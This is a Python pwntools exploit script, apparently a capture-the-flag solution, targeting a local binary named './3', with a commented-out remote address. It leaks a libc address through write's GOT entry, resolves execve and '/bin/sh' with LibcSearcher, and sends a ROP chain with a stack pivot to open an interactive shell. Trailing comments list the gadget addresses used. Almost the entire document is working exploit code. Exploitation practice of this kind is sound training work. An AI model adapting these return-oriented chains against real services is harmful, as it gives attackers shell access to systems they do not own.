from pwn import*
from LibcSearcher import*
# p=remote('8.130.110.158',2104)

p=process('./3')
# gdb.attach(p)
elf=ELF('./3')

context.log_level='debug'

vuln=0x401156
main=0x401070
write_plt=elf.plt['write']
write_got=elf.got['write']
read_plt=elf.plt['read']
pop_rdi=0x401243
rsi_r15=0x401241
ret=0x40101a
read0=0x4011A8

payload=p64(0)+p64(0x4040d8)*14+p64(pop_rdi)+p64(1)+p64(rsi_r15)+p64(write_got)+p64(write_got)+p64(write_plt)+p64(vuln)+p64(vuln)+p64(vuln)+p64(vuln)+p64(vuln)
payload1=b'a'*0x10+p64(0x4040D0)+p64(0x4011BB-1)
# 
p.sendlineafter('plz input your name:\n',payload)
p.sendlineafter('skinny!',payload1)
# p.recvuntil(b'\x7f')
p.recv()
addr=u64(p.recv(6).ljust(8,b'\x00'))
print(hex(addr))

# libc=ELF('./libc-2.31.so')
# base=addr-libc.symbols['write']
# system_addr=base+libc.symbols['execve']
# sh=base+next(libc.search(b"/bin/sh"))

libc=LibcSearcher('write',addr)
base=addr-libc.dump('write')
system_addr=base+libc.dump('execve')
sh=base+libc.dump('str_bin_sh')
strcmp=base+libc.dump('strcmp')

pop6=0x40123A
addx=int(system_addr%8)
addy=int((system_addr-addx)/8)

print(hex(sh))
print(hex(system_addr))
print(hex(addx))
print(hex(addy))
payload=p64(pop_rdi)+p64(sh)+p64(pop6)+p64(0x80817)+p64(0x0)+p64(0x4040C0)+p64(0x0)+p64(0x0)+p64(0x0)+p64(0x401220)+p64(system_addr)+b'/bin/sh\x00\x00\x00\x00\x00'
# p64(pop_rdi)+p64(0x404058)+p64(rsi_r15)+p64(0x404058)+p64(0)+p64(strcmp)
# payload=p64(6)+p64(0x4040d8)*8+p64(pop_rdi)+p64(1)+p64(rsi_r15)+p64(write_got)+p64(write_got)+p64(write_plt)+p64(pop_rdi)+p64(sh)+p64(system_addr)+p64(vuln)+p64(vuln)+p64(vuln)+p64(vuln)
p.sendlineafter('name:\n',payload)
# p.sendline(payload1)   +p64(0x4011BB)
payload1=b'a'*0x10+p64(0x404060)+p64(0x4011BB)
p.sendlineafter('skinny!',payload1)
p.interactive()


# 0x000000000040123c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040123e : pop r13 ; pop r14 ; pop r15 ; ret
# 0x0000000000401240 : pop r14 ; pop r15 ; ret
# 0x0000000000401242 : pop r15 ; ret
# 0x000000000040123b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040123f : pop rbp ; pop r14 ; pop r15 ; ret
# 0x000000000040113d : pop rbp ; ret
# 0x0000000000401243 : pop rdi ; ret
# 0x0000000000401241 : pop rsi ; pop r15 ; ret
# 0x000000000040123d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
# 0x000000000040101a : ret
